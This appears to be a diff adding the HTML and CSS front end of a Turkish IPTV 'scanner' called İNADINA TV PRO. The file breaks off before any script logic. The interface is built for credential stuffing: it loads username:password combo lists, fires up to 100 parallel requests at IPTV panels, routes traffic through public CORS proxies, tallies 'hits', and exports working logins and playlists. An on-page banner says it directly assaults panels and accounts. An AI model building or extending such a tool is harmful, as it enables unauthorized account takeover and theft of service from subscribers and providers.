@@ -1,0 +1,1229 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>İNADINA TV - PRO IPTV Tarayıcı v6.0</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #6366f1; --primary-dark: #4f46e5; --secondary: #94a3b8;
+            --accent: #f97316; --accent-grad: linear-gradient(135deg, #f97316, #f59e0b);
+            --dark: #1e293b; --darker: #0f172a; --light: #e2e8f0; --lighter: #f1f5f9;
+            --success: #22c55e; --error: #ef4444; --warning: #f59e0b; --info: #0ea5e9;
+            --font: 'Inter','Segoe UI',system-ui,-apple-system,sans-serif;
+            --radius: 12px; --radius-sm: 8px;
+            --shadow: 0 4px 20px rgba(0,0,0,0.25); --shadow-lg: 0 10px 40px rgba(0,0,0,0.3);
+            --speed: 0.3s;
+            --card: rgba(30,41,59,0.8); --border: rgba(255,255,255,0.1);
+            --glass: rgba(15,23,42,0.7); --glass-b: rgba(255,255,255,0.05);
+        }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: var(--font); background: var(--darker); color: var(--light);
+            min-height: 100vh; padding: 10px; padding-bottom: calc(10px + env(safe-area-inset-bottom));
+            overflow-x: hidden; line-height: 1.6; font-size: clamp(13px,3.5vw,16px);
+            background-image: radial-gradient(circle at 15% 50%, rgba(28,58,128,.15) 0%, transparent 25%),
+                              radial-gradient(circle at 85% 30%, rgba(249,115,22,.1) 0%, transparent 25%);
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 5px; position: relative; z-index: 1; width: 100%; }
+
+        /* HEADER */
+        .header {
+            background: var(--glass); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
+            padding: 15px; border-radius: var(--radius); margin-bottom: 20px;
+            border: 1px solid var(--glass-b); box-shadow: var(--shadow);
+            display: flex; justify-content: space-between; align-items: center; position: relative; overflow: hidden; flex-wrap: wrap; gap: 10px;
+        }
+        .header::before { content: ''; position: absolute; top: 0; left: 0; width: 5px; height: 100%; background: var(--accent-grad); }
+        .title { color: var(--lighter); font-size: clamp(1.1rem,4vw,1.8rem); font-weight: 700; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+        .title span { background: var(--accent-grad); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .title i { color: var(--accent); }
+        .subtitle { color: var(--secondary); font-size: .78rem; margin-top: 4px; }
+        .header-right { display: flex; gap: 8px; align-items: center; flex-shrink: 0; }
+        .theme-toggle {
+            background: var(--glass); border: 1px solid var(--glass-b); color: var(--light); width: 36px; height: 36px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all var(--speed); flex-shrink: 0;
+        }
+        .theme-toggle:hover { background: var(--primary); transform: rotate(15deg); }
+
+        /* PANEL */
+        .panel {
+            background: var(--card); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
+            border-radius: var(--radius); padding: 15px; margin-bottom: 20px; box-shadow: var(--shadow); border: 1px solid var(--border); width: 100%;
+        }
+        .panel-title { color: var(--lighter); font-size: clamp(.9rem,3vw,1.05rem); margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; font-weight: 600; }
+
+        /* INPUTS */
+        .input-group { margin-bottom: 14px; width: 100%; }
+        .input-group label { display: block; margin-bottom: 7px; color: var(--light); font-size: .83rem; font-weight: 500; }
+        .input-group input, .input-group select, .input-group textarea {
+            width: 100%; padding: 11px; border-radius: var(--radius-sm); border: 1px solid var(--border);
+            background: rgba(0,0,0,.2); color: var(--light); font-family: var(--font); transition: all var(--speed); font-size: clamp(13px,3.5vw,15px); max-width: 100%;
+        }
+        .input-group input:focus, .input-group select:focus, .input-group textarea:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 2px rgba(99,102,241,.3); }
+
+        /* MİNİ TEST LOG KUTUSU */
+        .mini-test-log {
+            background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: var(--radius-sm);
+            max-height: 170px; overflow-y: auto; padding: 8px; display: flex; flex-direction: column; gap: 6px;
+        }
+        .mini-test-log::-webkit-scrollbar { width: 5px; }
+        .mini-test-log::-webkit-scrollbar-thumb { background: var(--secondary); border-radius: 4px; }
+        .m-test-row {
+            background: rgba(0,0,0,0.2); border-radius: 6px; padding: 8px 10px; display: flex; justify-content: space-between; align-items: center; font-size: 0.8rem; border-left: 3px solid transparent; animation: sIn 0.3s ease;
+        }
+        .m-test-row.testing { border-left-color: var(--warning); }
+        .m-test-row.online { border-left-color: var(--success); background: rgba(34,197,94,0.1); }
+        .m-test-row.offline { border-left-color: var(--error); opacity: 0.6; }
+        .m-test-url { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-right: 10px; color: var(--light); font-family: monospace; }
+        .m-test-status { font-weight: 600; white-space: nowrap; font-size: 0.75rem; display: flex; align-items: center; gap: 4px; }
+
+        /* ALERT BOX */
+        .alert-box { background: rgba(34,197,94,.1); border: 1px solid var(--success); color: var(--light); padding: 10px; border-radius: var(--radius-sm); margin-bottom: 15px; font-size: 0.8rem; display: flex; align-items: center; gap: 10px; }
+        .alert-box i { color: var(--success); font-size: 1.2rem; }
+
+        /* SCAN MODE BUTTONS */
+        .scan-mode-group { display: flex; gap: 8px; margin-bottom: 14px; }
+        .scan-mode-btn {
+            flex: 1; padding: 10px 6px; border-radius: var(--radius-sm); border: 2px solid var(--border);
+            background: rgba(0,0,0,.2); color: var(--secondary); cursor: pointer; font-size: .78rem;
+            font-weight: 500; text-align: center; transition: all .2s;
+            display: flex; flex-direction: column; align-items: center; gap: 3px;
+        }
+        .scan-mode-btn.active { border-color: var(--primary); color: var(--lighter); background: rgba(99,102,241,.15); }
+        .scan-mode-btn i { font-size: .95rem; }
+        .scan-mode-btn small { font-size: .62rem; color: var(--secondary); line-height: 1.2; }
+
+        /* COMBO MANAGER */
+        .combo-manager { background: rgba(0,0,0,.15); border-radius: var(--radius); padding: 12px; border: 1px solid var(--border); }
+        .combo-slots { display: flex; flex-direction: column; gap: 10px; }
+        .combo-slot { background: rgba(0,0,0,.2); border-radius: var(--radius-sm); padding: 12px; border: 1px solid var(--border); position: relative; transition: all .25s; }
+        .combo-slot.active-scan { border-color: var(--success); box-shadow: 0 0 14px rgba(34,197,94,.25); }
+        .combo-slot.done-scan { border-color: var(--info); opacity: .78; }
+        .combo-slot-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; flex-wrap: wrap; gap: 6px; }
+        .combo-slot-name { font-weight: 600; font-size: .88rem; display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
+        .combo-slot-actions { display: flex; gap: 6px; align-items: center; }
+        .combo-slot-info { font-size: .74rem; color: var(--secondary); margin-top: 5px; display: flex; gap: 10px; flex-wrap: wrap; }
+        .combo-badge { display: inline-flex; align-items: center; gap: 3px; padding: 2px 8px; border-radius: 20px; font-size: .67rem; font-weight: 600; }
+        .badge-waiting { background: rgba(148,163,184,.2); color: var(--secondary); }
+        .badge-scanning { background: rgba(34,197,94,.2); color: var(--success); animation: pb 1s infinite; }
+        .badge-done { background: rgba(14,165,233,.2); color: var(--info); }
+        .badge-error { background: rgba(239,68,68,.2); color: var(--error); }
+        @keyframes pb { 0%,100%{opacity:1;} 50%{opacity:.4;} }
+        .combo-prog-mini { height: 4px; background: rgba(0,0,0,.2); border-radius: 2px; overflow: hidden; margin-top: 7px; }
+        .combo-prog-fill { height: 100%; background: var(--accent-grad); border-radius: 2px; transition: width .3s linear; }
+        .add-combo-btn { width: 100%; padding: 10px; border: 2px dashed var(--border); background: none; color: var(--secondary); border-radius: var(--radius-sm); cursor: pointer; font-size: .83rem; transition: all .2s; display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 10px; }
+        .add-combo-btn:hover { border-color: var(--primary); color: var(--primary); background: rgba(99,102,241,.06); }
+
+        /* BUTTONS & PROGRESS */
+        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 7px; padding: 11px 15px; border-radius: var(--radius-sm); border: none; background: var(--primary); color: white; font-weight: 500; cursor: pointer; transition: all var(--speed); text-align: center; font-size: clamp(.8rem,3vw,.92rem); margin-bottom: 9px; width: 100%; }
+        .btn:active { transform: scale(.97); } .btn:disabled { opacity: .5; cursor: not-allowed; }
+        .btn-block { display: flex; width: 100%; }
+        .btn-success { background: var(--success); } .btn-danger { background: var(--error); } .btn-warning { background: var(--warning); } .btn-secondary { background: var(--secondary); } .btn-info { background: var(--info); } .btn-sm { padding: 7px 11px; font-size: .8rem; width: auto; flex: none; margin-bottom: 0; }
+        
+        .progress-bar { height: 22px; background: rgba(0,0,0,.2); border-radius: 11px; overflow: hidden; position: relative; border: 1px solid var(--border); }
+        .progress-fill { height: 100%; background: var(--accent-grad); width: 0%; transition: width .3s linear; }
+        .progress-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); color: white; font-weight: bold; font-size: .78rem; text-shadow: 0 1px 2px rgba(0,0,0,.5); }
+
+        /* STATS */
+        .stats { display: grid; grid-template-columns: repeat(3,1fr); gap: 8px; margin-top: 14px; }
+        .stat-box { background: rgba(0,0,0,.2); padding: 10px 6px; border-radius: var(--radius-sm); text-align: center; border-top: 3px solid var(--primary); }
+        .stat-box.hit-box { border-top-color: var(--success); } .stat-box.err-box { border-top-color: var(--error); }
+        .stat-value { font-size: clamp(.95rem,4vw,1.35rem); font-weight: 700; color: var(--lighter); margin-bottom: 1px; }
+        .stat-label { font-size: clamp(.58rem,2vw,.68rem); color: var(--secondary); text-transform: uppercase; letter-spacing: .5px; font-weight: 500; }
+
+        /* KATEGORİZE EDİLMİŞ SONUÇLAR (YENİ SİSTEM) */
+        .results-header { display: flex; flex-direction: column; gap: 10px; margin-bottom: 13px; }
+        .results-title { color: var(--lighter); font-size: clamp(.95rem,3.5vw,1.15rem); font-weight: 600; }
+        .action-buttons { display: flex; flex-wrap: wrap; gap: 7px; }
+        .results-list { max-height: 500px; overflow-y: auto; padding-right: 3px; }
+        
+        .panel-group { background: rgba(0,0,0,0.15); border: 1px solid var(--border); border-radius: var(--radius-sm); margin-bottom: 12px; overflow: hidden; animation: sIn 0.3s ease; }
+        .panel-group-header { background: rgba(0,0,0,0.25); padding: 12px 15px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; font-weight: 600; color: var(--lighter); border-bottom: 1px solid transparent; transition: all 0.2s; font-size: 0.9rem; }
+        .panel-group-header:hover { background: rgba(0,0,0,0.4); }
+        .panel-group-header i.fa-chevron-down { transition: transform 0.3s; }
+        .panel-group.open .panel-group-header i.fa-chevron-down { transform: rotate(180deg); }
+        .panel-group.open .panel-group-header { border-bottom-color: var(--border); }
+        .pg-title-wrap { display: flex; align-items: center; gap: 8px; flex: 1; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; padding-right: 10px; }
+        .panel-group-badge { background: var(--success); color: white; padding: 3px 10px; border-radius: 12px; font-size: 0.75rem; font-weight: 700; display: inline-flex; align-items: center; gap: 5px; flex-shrink: 0; }
+        
+        .panel-group-body { padding: 12px; display: none; }
+        .panel-group.open .panel-group-body { display: block; }
+
+        .result-item { background: rgba(0,0,0,.2); border-radius: var(--radius-sm); padding: 12px; margin-bottom: 10px; border-left: 4px solid var(--primary); word-break: break-word; }
+        .result-item:last-child { margin-bottom: 0; }
+        @keyframes sIn { from{opacity:0;transform:translateY(-7px);} to{opacity:1;transform:translateY(0);} }
+        .source-tag { font-size: .66rem; background: rgba(99,102,241,.2); color: var(--primary); padding: 2px 7px; border-radius: 10px; font-weight: 600; }
+        .result-header-row { display: flex; justify-content: space-between; align-items: flex-start; gap: 7px; flex-wrap: wrap; }
+        .result-title { color: var(--accent); font-size: clamp(.85rem,3vw,.98rem); font-weight: 700; display: flex; align-items: center; gap: 5px; }
+        .result-content { display: flex; flex-direction: column; gap: 5px; margin-top: 8px;}
+        .result-field { font-size: clamp(.78rem,2.5vw,.88rem); }
+        .field-label { font-weight: 600; color: var(--light); display: flex; align-items: center; gap: 4px; }
+        .field-value { color: var(--secondary); word-break: break-all; font-size: .8rem; }
+
+        /* LOG */
+        .scan-log { max-height: 300px; overflow-y: auto; background: rgba(0,0,0,.35); border-radius: var(--radius-sm); padding: 10px; font-family: monospace; font-size: .73rem; color: var(--secondary); border: 1px solid var(--border); }
+        .log-line { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,.04); }
+        .log-hit { color: var(--success); font-weight: 600; } .log-error { color: var(--error); } .log-info { color: var(--info); } .log-warn { color: var(--warning); }
+
+        /* TABS */
+        .tab-container { display: flex; margin-bottom: 0; border-bottom: 1px solid var(--border); overflow-x: auto; scrollbar-width: none; -webkit-overflow-scrolling: touch; }
+        .tab-container::-webkit-scrollbar { display: none; }
+        .tab { padding: 11px 5px; cursor: pointer; border-bottom: 3px solid transparent; transition: all var(--speed); font-weight: 500; flex: 1; text-align: center; user-select: none; -webkit-user-select: none; font-size: clamp(.72rem,2.5vw,.88rem); white-space: nowrap; min-width: 76px; }
+        .tab.active { border-bottom-color: var(--accent); color: var(--accent); }
+        .swipe-hint { text-align: center; font-size: .65rem; color: var(--secondary); opacity: .7; padding: 5px 0 9px; }
+        .tab-wrapper { overflow: hidden; position: relative; width: 100%; }
+        .tab-slider { display: flex; transition: transform .35s cubic-bezier(.4,0,.2,1); will-change: transform; width: 100%; }
+        .tab-content { min-width: 100%; flex-shrink: 0; padding-top: 14px; width: 100%; }
+
+        /* NOTIFICATION & MODAL */
+        .notification { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(200%); background: var(--card); backdrop-filter: blur(10px); color: white; padding: 11px 18px; border-radius: var(--radius); box-shadow: var(--shadow-lg); transition: transform .4s ease; z-index: 1000; border: 1px solid var(--border); width: 90%; max-width: 370px; text-align: center; display: flex; align-items: center; gap: 9px; font-size: .86rem; }
+        .notification.show { transform: translateX(-50%) translateY(0); } .notification.success { border-left: 4px solid var(--success); } .notification.error { border-left: 4px solid var(--error); } .notification.warning { border-left: 4px solid var(--warning); }
+        
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,.88); z-index: 2000; justify-content: center; align-items: center; padding: 15px; opacity: 0; transition: opacity var(--speed); }
+        .modal.show { opacity: 1; }
+        .modal-content { background: var(--card); padding: 25px; border-radius: var(--radius); width: 100%; max-width: 600px; max-height: 88vh; overflow-y: auto; position: relative; border: 1px solid var(--border); box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+        .modal-close { position: absolute; top: 15px; right: 15px; background: rgba(255,255,255,0.1); border: none; color: var(--light); font-size: 1.2rem; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s;}
+        .modal-close:hover { background: var(--error); color: white; }
+        .modal-title { color: var(--accent); margin-bottom: 20px; font-size: 1.25rem; padding-right: 30px; font-weight: 700; border-bottom: 1px solid var(--border); padding-bottom: 10px;}
+        .modal-body { color: var(--light); line-height: 1.7; font-size: .88rem; }
+
+        @media (min-width: 768px) {
+            body { padding: 25px; } .container { padding: 20px; } .header { padding: 22px; flex-wrap: nowrap; } .stats { grid-template-columns: repeat(6,1fr); } .panel { padding: 18px; } .results-header { flex-direction: row; justify-content: space-between; align-items: center; } .result-content { display: grid; grid-template-columns: repeat(auto-fill,minmax(200px,1fr)); gap: 9px; }
+        }
+
+        /* ===== TV BOX / ANDROID TV ERİŞİLEBİLİRLİĞİ ===== */
+        :focus-visible { outline: 3px solid var(--accent); outline-offset: 3px; box-shadow: 0 0 0 5px rgba(249,115,22,.25); }
+        .tv-hint { display:none; }
+        @media (min-width: 1000px) {
+            body { font-size: 17px; padding: 28px; }
+            .container { max-width: 1500px; padding: 22px; }
+            .panel { padding: 22px; }
+            .tab { min-height: 54px; padding: 15px 10px; font-size: 1rem; }
+            .btn { min-height: 48px; }
+            .btn.btn-sm { min-height: 42px; padding: 10px 15px; font-size: .9rem; }
+            .input-group input, .input-group select, .input-group textarea { font-size: 1rem; }
+            .hit-item, .cat-item, .ch-item { min-height: 48px; padding: 12px 15px; font-size: .95rem; }
+            .results-list { max-height: 650px; }
+            .tv-hint { display:block; color:var(--secondary); font-size:.78rem; margin-top:8px; }
+        }
+        @media (min-width: 1400px) {
+            .container { max-width: 1700px; }
+            .player-sidebar { width: 360px; }
+            .ch-list { max-height: 520px; }
+        }
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after { animation-duration:.01ms !important; transition-duration:.01ms !important; scroll-behavior:auto !important; }
+        }
+
+        body.light-theme { --darker: #f1f5f9; --dark: #e2e8f0; --light: #475569; --lighter: #1e293b; --secondary: #64748b; --card: rgba(226,232,240,.95); --border: rgba(0,0,0,.1); --glass: rgba(241,245,249,.9); --glass-b: rgba(0,0,0,.05); background-image: none; background-color: var(--darker); }
+        input, select, textarea, button { -webkit-appearance: none; -moz-appearance: none; appearance: none; border-radius: var(--radius-sm); }
+        
+        /* ===== PLAYER CSS ===== */
+        .player-layout { display: flex; gap: 12px; flex-direction: column; }
+        @media(min-width:768px){ .player-layout { flex-direction: row; } }
+        .player-sidebar { width: 100%; background: rgba(0,0,0,.25); border-radius: var(--radius-sm); border: 1px solid var(--border); overflow: hidden; display: flex; flex-direction: column; }
+        @media(min-width:768px){ .player-sidebar { width: 300px; flex-shrink: 0; } }
+        .hit-list { max-height: 160px; overflow-y: auto; } @media(min-width:768px){ .hit-list { max-height: 220px; } }
+        .hit-item { padding: 9px 12px; cursor: pointer; border-bottom: 1px solid var(--border); font-size: .82rem; transition: background .15s; display: flex; align-items: center; gap: 7px; }
+        .hit-item:hover { background: rgba(99,102,241,.12); } .hit-item.active { background: rgba(99,102,241,.22); border-left: 3px solid var(--primary); }
+        .hit-item-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; } .hit-item-source { font-size: .64rem; color: var(--secondary); }
+        .cat-header { padding: 8px 12px; font-size: .75rem; font-weight: 700; color: var(--accent); background: rgba(0,0,0,.2); border-bottom: 1px solid var(--border); text-transform: uppercase; letter-spacing: .5px; display: flex; align-items: center; gap: 6px; }
+        .cat-search, .ch-search { padding: 8px 10px; background: rgba(0,0,0,.2); border: none; border-bottom: 1px solid var(--border); color: var(--light); font-family: var(--font); font-size: .82rem; width: 100%; outline: none; }
+        .cat-list { max-height: 200px; overflow-y: auto; } @media(min-width:768px){ .cat-list { max-height: 260px; } }
+        .cat-item { padding: 8px 12px; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,.04); font-size: .82rem; transition: background .15s; display: flex; justify-content: space-between; align-items: center; }
+        .cat-item:hover { background: rgba(99,102,241,.1); } .cat-item.active { background: rgba(249,115,22,.15); border-left: 3px solid var(--accent); }
+        .ch-list { flex: 1; overflow-y: auto; max-height: 280px; } @media(min-width:768px){ .ch-list { max-height: 340px; } }
+        .ch-item { padding: 8px 12px; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,.04); font-size: .82rem; transition: background .15s; display: flex; align-items: center; gap: 8px; }
+        .ch-item:hover { background: rgba(99,102,241,.1); } .ch-item.active { background: rgba(34,197,94,.15); border-left: 3px solid var(--success); }
+        .player-main { flex: 1; display: flex; flex-direction: column; gap: 10px; min-width: 0; }
+        
+        .video-wrap { width: 100%; background: #000; border-radius: var(--radius-sm); aspect-ratio: 16/9; overflow: hidden; position: relative; border: 1px solid var(--border); display: flex; justify-content: center; align-items: center; scroll-margin-top: 15px; }
+        .video-wrap video { width: 100%; height: 100%; outline: none; object-fit: contain; }
+        .video-placeholder { width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--secondary); gap: 10px; font-size: .88rem; }
+        
+        .now-playing { background: rgba(0,0,0,.2); border-radius: var(--radius-sm); padding: 10px 14px; border: 1px solid var(--border); font-size: .83rem; }
+        .np-title { font-weight: 700; color: var(--lighter); margin-bottom: 3px; font-size: .95rem; } .np-meta { color: var(--secondary); font-size: .75rem; display: flex; gap: 12px; flex-wrap: wrap; }
+        .player-controls { display: flex; gap: 8px; flex-wrap: wrap; } 
+        .player-controls .btn { margin-bottom: 0; flex: 1; white-space: nowrap;}
+        @media(min-width: 768px) { .player-controls .btn { flex: none; } }
+        .player-empty { text-align: center; padding: 40px 20px; color: var(--secondary); } 
+        .player-empty i { font-size: 3rem; opacity: .2; margin-bottom: 12px; display: block; }
+        .wuffy-color { background: #eab308; color: #000; }
+        .vlc-color { background: #f97316; color: #fff; }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <div class="header">
+        <div>
+            <h1 class="title"><i class="fas fa-bolt"></i>İNADINA <span>TV PRO</span> <button class="btn btn-sm btn-secondary" style="margin-left:5px;padding:4px 8px;" id="help-btn">?</button></h1>
+            <p class="subtitle">v6.0 — HTTPS Harici İndirme + TV Box Uyumlu</p>
+        </div>
+        <div class="header-right"><div class="theme-toggle" id="theme-toggle"><i class="fas fa-moon"></i></div></div>
+    </div>
+
+    <div class="tab-container">
+        <div class="tab active" data-tab="0"><i class="fas fa-cog"></i> Ayarlar</div>
+        <div class="tab" data-tab="1"><i class="fas fa-list"></i> Sonuçlar</div>
+        <div class="tab" data-tab="2"><i class="fas fa-terminal"></i> Log</div>
+        <div class="tab" data-tab="3"><i class="fas fa-download"></i> Çıktı</div>
+        <div class="tab" data-tab="4"><i class="fas fa-play-circle"></i> Player</div>
+    </div>
+    <div class="swipe-hint">← Sekmeler arasında kaydırabilirsiniz →</div>
+
+    <div class="tab-wrapper" id="tab-wrapper">
+        <div class="tab-slider" id="tab-slider">
+
+            <div class="tab-content">
+                <div class="panel">
+                    <h2 class="panel-title"><i class="fas fa-sliders-h"></i> Tarama Ayarları</h2>
+                    
+                    <div class="alert-box">
+                        <i class="fas fa-rocket"></i> 
+                        <div><b>DİREKT TARAMA:</b> Ön test aşamaları tamamen kaldırıldı! Başlat butonuna bastığınız an sistem panellere ve hesaplara direkt hücum eder.</div>
+                    </div>
+
+                    <div class="input-group">
+                        <label for="host">IPTV Sunucuları <span style="font-size:0.75rem; color:var(--accent);">(Araya virgül koyarak çoklu yazabilirsiniz)</span></label>
+                        <input type="text" id="host" placeholder="Örn: http://panel1.com:80, http://panel2.com:8080" autocomplete="off">
+                    </div>
+                    <div class="input-group">
+                        <label for="threads">Toplam Eşzamanlı İşlemci (Global Thread)</label>
+                        <select id="threads">
+                            <option value="1">1 İstek (Çok Yavaş)</option>
+                            <option value="5">5 İstek (Yavaş)</option>
+                            <option value="12" selected>12 İstek (Önerilen Hız)</option>
+                            <option value="25">25 İstek (Turbo)</option>
+                            <option value="50">50 İstek (Ultra)</option>
+                            <option value="100">100 İstek (İnterneti Yorabilir)</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label for="cors-proxy" style="color:var(--accent);font-weight:600;"><i class="fas fa-shield-alt"></i> Bağlantı Tipi (Proxy/CORS)</label>
+                        <select id="cors-proxy" style="border-color:var(--accent); font-weight: bold; background: rgba(249,115,22,0.1);">
+                            <option value="none" selected>🚀 HİÇ PROXY YOK (Sisteme Bırak - En Hızlı)</option>
+                            <option value="corsproxy">CorsProxy.io (Zorla)</option>
+                            <option value="codetabs">CodeTabs Proxy (Zorla)</option>
+                            <option value="allorigins">AllOrigins Proxy (Zorla)</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Tarama Modu</label>
+                        <div class="scan-mode-group">
+                            <button class="scan-mode-btn active" id="mode-par" onclick="setScanMode('parallel')">
+                                <i class="fas fa-code-branch"></i>
+                                <span>Paralel Tarama</span>
+                                <small>Tüm listeleri aynı anda döver!</small>
+                            </button>
+                            <button class="scan-mode-btn" id="mode-seq" onclick="setScanMode('sequential')">
+                                <i class="fas fa-sort-amount-down"></i>
+                                <span>Sıralı Tarama</span>
+                                <small>Listeleri tek tek bitirir</small>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- HIZLI PANEL KONTROL PENCERESİ -->
+                <div class="panel">
+                    <h2 class="panel-title"><i class="fas fa-wifi"></i> Sunucu Bağlantı Testi (Hızlı API)</h2>
+                    <div class="input-group">
+                        <label for="test-host" style="color:var(--secondary); font-size:0.75rem;">Test edilecek panel URL'lerini alt alta veya virgülle ayırarak yapıştırın.</label>
+                        <textarea id="test-host" rows="3" placeholder="http://panel1.com:80
+http://panel2.com:8080" autocomplete="off"></textarea>
+                    </div>
+                    <button id="test-btn" class="btn btn-info"><i class="fas fa-bolt"></i> Hızlı Testi Başlat</button>
+                    
+                    <div id="test-log-container" style="display:none; margin-top:15px;">
+                        <!-- Pencere İçi Log -->
+                        <div class="mini-test-log" id="multi-test-results"></div>
+                        <!-- Alt Kısım Durum / Buton -->
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px; font-size:0.8rem;">
+                            <span id="test-stats" style="color:var(--secondary);">Bekleniyor...</span>
+                            <button id="add-all-working-btn" class="btn btn-success btn-sm" style="display:none; margin:0;"><i class="fas fa-plus-circle"></i> Çalışanları Ekle</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="panel">
+                    <h2 class="panel-title">
+                        <span><i class="fas fa-layer-group"></i> Combo Listeleri</span>
+                        <span style="font-size:.73rem;color:var(--secondary);" id="total-label">0 kombo</span>
+                    </h2>
+                    <div class="combo-manager">
+                        <div class="combo-slots" id="combo-slots"></div>
+                        <button class="add-combo-btn" onclick="addComboSlot()"><i class="fas fa-plus-circle"></i> Yeni Combo Listesi Ekle (max 5)</button>
+                    </div>
+                </div>
+
+                <div class="panel">
+                    <h2 class="panel-title"><i class="fas fa-play-circle"></i> Tarama Motoru</h2>
+                    <button id="start-btn" class="btn btn-success btn-block" style="font-size:1.1rem; padding:15px;"><i class="fas fa-play"></i> TARAMAYI BAŞLAT</button>
+                    <button id="stop-btn" class="btn btn-danger btn-block" disabled><i class="fas fa-stop"></i> DURDUR</button>
+                    <button id="clear-btn" class="btn btn-secondary btn-block"><i class="fas fa-broom"></i> TEMİZLE</button>
+                </div>
+
+                <div class="panel">
+                    <h2 class="panel-title"><i class="fas fa-chart-line"></i> Canlı İlerleme</h2>
+                    <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div><div class="progress-text" id="progress-text">0%</div></div>
+                    <div class="stats">
+                        <div class="stat-box"><div class="stat-value" id="s-total">0</div><div class="stat-label">İşlenen</div></div>
+                        <div class="stat-box hit-box"><div class="stat-value" id="s-hits">0</div><div class="stat-label">Hit ✅</div></div>
+                        <div class="stat-box err-box"><div class="stat-value" id="s-errors">0</div><div class="stat-label">Hata ❌</div></div>
+                        <div class="stat-box"><div class="stat-value" id="s-speed">0</div><div class="stat-label">Hız (İ/S)</div></div>
+                        <div class="stat-box"><div class="stat-value" id="s-active">0</div><div class="stat-label">Aktif Thread</div></div>
+                        <div class="stat-box"><div class="stat-value" id="s-remain">0</div><div class="stat-label">Kalan</div></div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="tab-content">
+                <div class="panel">
+                    <div class="results-header">
+                        <h2 class="results-title"><i class="fas fa-folder-open"></i> Kategorize Sonuçlar <span id="results-count" style="font-size:.78rem;color:var(--secondary);">(0)</span></h2>
+                        <div class="action-buttons">
+                            <button class="btn btn-success btn-sm" id="copy-all-btn"><i class="fas fa-copy"></i> Tümünü Kopyala</button>
+                            <button class="btn btn-warning btn-sm" id="copy-combo-btn"><i class="fas fa-user-lock"></i> Sadece Combo</button>
+                        </div>
+                    </div>
+                    <!-- HİTLER ARTIK BU ALANDA PANELLERE GÖRE KLASÖRLENEREK LİSTELENECEK -->
+                    <div class="results-list" id="results-list">
+                        <div style="text-align:center;padding:30px;color:var(--secondary);"><p><i class="fas fa-inbox" style="font-size:2rem;opacity:.3;"></i></p><p style="margin-top:10px;">Henüz hit bulunamadı.</p></div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="tab-content">
+                <div class="panel">
+                    <h2 class="panel-title"><span><i class="fas fa-terminal"></i> Sistem Logları</span><button class="btn btn-sm btn-secondary" style="margin:0;" onclick="clearLog()"><i class="fas fa-trash"></i></button></h2>
+                    <div class="scan-log" id="scan-log"><div class="log-line log-info">[SİSTEM] İNADINA TV PRO v5.8 hazır. Hit sonuçları artık panellere göre klasörlenerek listelenir.</div></div>
+                </div>
+            </div>
+            
+            <div class="tab-content">
+                <div class="panel">
+                    <h2 class="panel-title"><i class="fas fa-file-export"></i> Veri Dışa Aktarımı</h2>
+                    <div class="input-group">
+                        <label>Format Seçin</label>
+                        <select id="exp-format"><option value="detailed" selected>Detaylı Format (.txt)</option><option value="simple">Sadece Combo (user:pass .txt)</option><option value="m3u">M3U Playlist (.m3u)</option></select>
+                    </div>
+                    <div class="input-group"><button id="gen-export-btn" class="btn btn-success btn-block"><i class="fas fa-file-code"></i> Dosyayı Hazırla</button><button id="dl-export-btn" class="btn btn-primary btn-block" disabled><i class="fas fa-globe"></i> Harici Tarayıcıda İndir</button><p class="tv-hint"><i class="fas fa-info-circle"></i> TV Box kumandasında odaklanan düğmeyi OK/Enter ile seçin.</p></div>
+                    <div class="input-group"><textarea id="exp-preview" rows="10" readonly style="font-family:monospace;font-size:.75rem;" placeholder="Önizleme burada görünecek..."></textarea></div>
+                </div>
+            </div>
+
+            <!-- OYNATICI (PLAYER) TAB'I -->
+            <div class="tab-content" id="player-tab">
